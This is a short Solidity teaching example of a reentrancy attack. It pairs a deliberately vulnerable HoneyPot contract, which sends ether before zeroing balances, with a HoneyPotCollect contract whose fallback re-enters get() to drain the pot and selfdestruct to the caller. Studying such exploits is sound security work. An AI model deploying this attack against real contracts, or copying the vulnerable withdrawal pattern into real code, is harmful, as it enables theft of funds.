pragma solidity ^0.4.19;

// Reentrancy vulnerable contract example

contract HoneyPot {
    mapping (address=>uint) public balances;

    function HoneyPot() public payable {
        put();
    }

    function put() public payable {
        balances[msg.sender] += msg.value;
    }

    function get() public {
        if (!msg.sender.call.value(balances[msg.sender])()) {
            revert();
        }

        balances[msg.sender] = 0;
    }

    function() public {
        revert();
    }
}


contract HoneyPotCollect {
    HoneyPot public honeypot;

    function HoneyPotCollect(address _honeypot) public {
        honeypot = HoneyPot(_honeypot);
    }

    // The kill() function destroys the HoneyPotCollect
    // and send all ether containing in it to the address that calls the kill function. 
    function kill() public {
        selfdestruct(msg.sender);
    }

    // The collect() function is the one that will set the reentrancy attack in motion.
    // It puts some ether in HoneyPot and right after it gets it. 
    // The payable term here tells the Ethereum Virtual Machine
    // that it permits to receive ether. Invoke this function with also some ether.
    function collect() public payable {
        honeypot.put.value(msg.value)();
        honeypot.get();
        kill();
    }

    // The last function is the fallback function.
    // This unnamed function is called whenever the HoneyPotCollect
    // contract receives ether
    function() public payable {
        if (honeypot.balance >= msg.value) {
            honeypot.get();
        }
    }
}